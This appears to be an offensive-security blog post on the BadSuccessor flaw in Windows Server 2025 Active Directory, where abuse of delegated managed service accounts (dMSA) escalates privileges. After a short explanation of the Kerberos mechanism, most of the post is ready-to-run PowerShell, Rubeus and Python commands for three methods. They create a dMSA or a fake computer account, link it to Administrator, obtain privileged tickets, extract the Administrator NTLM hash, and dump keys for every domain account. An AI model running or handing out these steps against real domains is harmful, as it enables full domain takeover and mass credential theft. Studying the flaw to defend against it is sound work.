# Mastering BadSuccessor: 3 Ways to Exploit dMSA for PrivEsc

## BadSuccessor?

Recent security research by Yuval Gordon at Akamai revealed a critical vulnerability in Windows Server 2025 known as **BadSuccessor**. Any Active Directory environment with at least one Windows Server 2025 Domain Controller may be affected. This issue enables a low‑privileged attacker to obtain Domain Admin–level privileges without modifying privileged accounts or triggering typical security alerts.

The vulnerability stems from abuse of the Delegated Managed Service Account (dMSA) migration mechanism. An attacker who can create and control a dMSA can manually configure the `msDS-ManagedAccountPrecededByLink` attribute to reference a highly privileged account (such as Administrator) and set `msDS-DelegatedMSAState` to 2. When authentication occurs, the Key Distribution Center (KDC) incorrectly processes this migration relationship and inserts the referenced account’s SID into the Kerberos PAC.

The **Kerberos PAC (Privilege Attribute Certificate)** is the authorization data embedded within a Kerberos ticket. It contains the identity and privilege information that Windows services rely on to determine what the authenticated principal is allowed to access, including security identifiers (SIDs) and group memberships. Services typically trust the PAC contents without performing a fresh authorization lookup in Active Directory. In this vulnerability, the KDC constructs the PAC using the privileged account referenced in the migration attribute rather than the actual authenticating identity. As a result, the issued ticket carries the security context of the privileged account, causing services to treat the attacker‑controlled dMSA as that account and enabling effective privilege escalation.

The only prerequisite for exploitation is the ability to create child objects within an Organizational Unit (OU), allowing the attacker to create and manage a dMSA.

![3_dMSA abuse (BadSuccessor)_bads](https://github.com/user-attachments/assets/989535a5-9854-422b-b129-eebc9082a4c4)

You can read the full technical blog from [Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory).

## Introduction

Over the past few days, I explored the BadSuccessor attack through hands‑on practice in TryHackMe and Hack The Box environments. After extensive research and experimentation, I identified multiple practical exploitation paths. This article documents those approaches and explains how they can be leveraged in real attack scenarios.

Below are three different ways to exploit this vulnerability.

---

## Method 1 — Normal Way

This method uses an existing domain user account that has permission to create dMSAs in an OU. 

### Setup

```powershell
# 1. Create the dMSA
New-ADServiceAccount -Name badDMSA `
    -DNSHostName badpcDMSA.<DOMAIN> `
    -CreateDelegatedServiceAccount `
    -KerberosEncryptionType AES256 `
    -PrincipalsAllowedToRetrieveManagedPassword "<YOUR_USER>" `
    -Path "OU=<OU>,DC=<DC>,DC=<TLD>" -Verbose

# 2. Give your user GenericAll over the dMSA
$sid = (Get-ADUser -Identity "<YOUR_USER>").SID
$acl = Get-Acl "AD:\CN=badDMSA,OU=<OU>,DC=<DC>,DC=<TLD>"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=badDMSA,OU=<OU>,DC=<DC>,DC=<TLD>" -AclObject $acl -Verbose

# 3. Point the dMSA at your target account (e.g. Administrator)
Set-ADServiceAccount -Identity badDMSA -Replace @{
    'msDS-ManagedAccountPrecededByLink' = 'CN=<TARGET_USER>,CN=Users,DC=<DC>,DC=<TLD>'
    'msDS-DelegatedMSAState'            = 2
} -Verbose

# 4. Verify
Get-ADObject -Filter "name -like '*DMSA'"
```

### Request Tickets Using Rubeus

```text
# Get dMSA TGT using your existing user TGT
.\Rubeus.exe asktgs /targetuser:badDMSA$ /service:krbtgt/<DOMAIN> `
    /opsec /dmsa /nowrap /ticket:<YOUR_USER_TGT>.kirbi /outfile:dmsa_tgt.kirbi

```

You can later use that ticket to perform DCSync with mimikatz or secretsdump.py

---

## Method 2 — Machine Way

You also use a newly created computer account to request the dMSA TGT. This is possible when `MachineAccountQuota > 0`.

### Setup

```powershell
# 1. Create a fake computer account with a known password
New-ADComputer -Name "BADPC" -Path "OU=<OU>,DC=<DC>,DC=<TLD>" -PassThru |
    Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force)

# 2.
New-ADServiceAccount -Name badpcDMSA -DNSHostName badpcDMSA.DOMAIN -CreateDelegatedServiceAccount -KerberosEncryptionType AES256 -PrincipalsAllowedToRetrieveManagedPassword "BADPC$" -Path "OU=<OU>,DC=<DC>,DC=<TLD>" -Verbose

# 3. Give your user GenericAll over the dMSA (badpcDMSA created alongside the computer)
$sid = (Get-ADUser -Identity "<YOUR_USER>").SID
$acl = Get-Acl "AD:\CN=badpcDMSA,OU=<OU>,DC=<DC>,DC=<TLD>"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=badpcDMSA,OU=<OU>,DC=<DC>,DC=<TLD>" -AclObject $acl -Verbose

# 4. Point the dMSA at your target account
Set-ADServiceAccount -Identity badpcDMSA -Replace @{
    'msDS-ManagedAccountPrecededByLink' = 'CN=<TARGET_USER>,CN=Users,DC=<DC>,DC=<TLD>'
    'msDS-DelegatedMSAState'            = 2
} -Verbose
```

### Request Tickets (Rubeus)

```text
# Derive AES256 key from the computer account password
.\Rubeus.exe hash /password:'<PASSWORD>' /user:BADPC$ /domain:<DOMAIN>

# Get a TGT for the computer account using its AES256 key
.\Rubeus.exe asktgt /user:BADPC$ /aes256:<AES256_KEY> /domain:<DOMAIN> /outfile:badpc_tgt.kirbi

# Get dMSA TGT using the computer TGT
.\Rubeus.exe asktgs /targetuser:badpcDMSA$ /service:krbtgt/<DOMAIN> `
    /opsec /dmsa /nowrap /ticket:badpc_tgt.kirbi /outfile:dmsa_tgt.kirbi
```

---

## Method 3 — Previous Way

When you request a TGT for a dMSA, the KDC also issues a `KERB-DMSA-KEY-PACKAGE` structure. This structure contains `current-keys` (the dMSA's keys) and `previous-keys` (the superseded account's NTLM hash which is in our case the `Administrator hash`). This allows you to extract the hash of any account in the domain.

![7_dMSA abuse (BadSuccessor)_bads](https://github.com/user-attachments/assets/de511868-61d8-4283-abbb-67ac68b0fb20)

### Option A: Using Rubeus #PR 204

Unfortunately, the developers of Rubeus are not giving the tool sufficient attention; as there is an open [pull request #204](https://github.com/GhostPack/Rubeus/pull/204) on Rubeus repoistory since May 2025, if you use the updated Rubeus PR, it automatically parses the previous keys from the ticket.

```text
.\Rubeus.exe asktgs /targetuser:badDMSA$ /service:krbtgt/domain /opsec /dmsa /nowrap /ticket:your_ticket
...
 Current Keys for badDMSA$: (aes256_cts_hmac_sha1) 69CCB61333ABCF21AA0A549DFA84BF0AC92859FA9776EB013630E97E3EC12622
 Current Keys for badDMSA$: (rc4_hmac) 6CCDAF7947E8093C33A17BF492AB49AD
 Previous Keys for badDMSA$: (rc4_hmac) 0B133BE956BFCDDF9CEA56702AFFDDEC
```

### Option B: Rubeus without #PR 204


You can use standard Rubeus with debug flag to get the base64 output of the KDC reply that contains `KERB-DMSA-KEY-PACKAGE`:

```text
.\Rubeus.exe asktgs /targetuser:badDMSA$ /service:krbtgt/DOMAIN /opsec /dmsa /nowrap /ticket:your_ticket /debug
```

The output will be messy, search for `TGS request successful` and copy the base64 under it.

<img width="2256" height="166" alt="image" src="https://github.com/user-attachments/assets/28b03711-292d-439c-842c-46d083907c57" />

go to an ASN.1 decoder like https://lapo.it/asn1js 

You will see many hashes, which are current keys and previous keys, the last one is the previous key which is the Admin hash

<img width="1488" height="508" alt="Previous Way_image" src="https://github.com/user-attachments/assets/1eb9e87d-1484-4282-a927-df13ba1c8625" />

### Option C: Dumping the Entire Domain via [dMSASync.py](https://gist.github.com/snovvcrash/a1ae180ab3b49acb43da8fd34e7e93df)

You can use this script to automate this to loop through every user and computer, set them as the predecessor, and extract their `previous-keys`.

**Setup & Execution:**

```bash
# Setup venv (one time)
python3 -m venv /opt/dmsa-env
source /opt/dmsa-env/bin/activate
pip install git+[https://github.com/skelsec/minikerberos.git](https://github.com/skelsec/minikerberos.git)
pip install git+[https://github.com/skelsec/msldap.git](https://github.com/skelsec/msldap.git)

# Get a TGT for your user
getTGT.py '<DOMAIN>/<YOUR_USER>:<PASSWORD>@<DC_IP>'
export KRB5CCNAME=<YOUR_USER>.ccache

# Run the dump — outputs sAMAccountName -> RC4/AES key for every account
python3 dMSASync.py \
    '<DOMAIN>/<YOUR_USER>:<YOUR_USER>.ccache@<DC_HOSTNAME>/?dc=<DC_IP>' \
    'CN=badDMSA,OU=<OU>,DC=<DC>,DC=<TLD>'
```

